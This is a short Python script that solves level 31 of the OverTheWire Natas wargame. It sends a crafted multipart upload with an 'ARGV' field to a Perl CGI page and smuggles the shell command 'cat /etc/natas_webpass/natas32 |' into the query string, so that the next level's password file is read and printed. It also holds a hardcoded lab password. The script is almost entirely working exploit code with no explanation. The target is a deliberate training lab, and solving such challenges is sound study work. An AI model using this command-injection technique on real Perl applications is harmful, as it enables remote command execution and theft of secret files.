import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    headers = {
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryzI73FVSf9Ocjjgr7"
    }
    payload = f'------WebKitFormBoundaryzI73FVSf9Ocjjgr7\r\n' \
            f'Content-Disposition: form-data; name="file";\r\n\r\n' \
            f'ARGV\r\n' \
            f'------WebKitFormBoundaryzI73FVSf9Ocjjgr7\r\n' \
          f'Content-Disposition: form-data; name="file"; filename="password"\r\n' \
          f'Content-Type: image/jpeg\r\n\r\n' \
          f'aaa\r\n\r\n' \
          f'------WebKitFormBoundaryzI73FVSf9Ocjjgr7\r\n' \
          f'Content-Disposition: form-data; name="submit"\r\n\r\n' \
          f'Upload\r\n' \
          f'------WebKitFormBoundaryzI73FVSf9Ocjjgr7-'
    
    url_payload = "index.pl?cat /etc/natas_webpass/natas32 |"
    req = requests.post(url + url_payload,data=payload, headers=headers, auth=(username,password))
    text = re.findall("<tr><th>(.*)",req.text)
    print("The flag for natas31 is: " + text[0])

if __name__=="__main__":
    url = "http://natas31.natas.labs.overthewire.org/"
    username = "natas31"
    password = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"
    flag(url,username,password)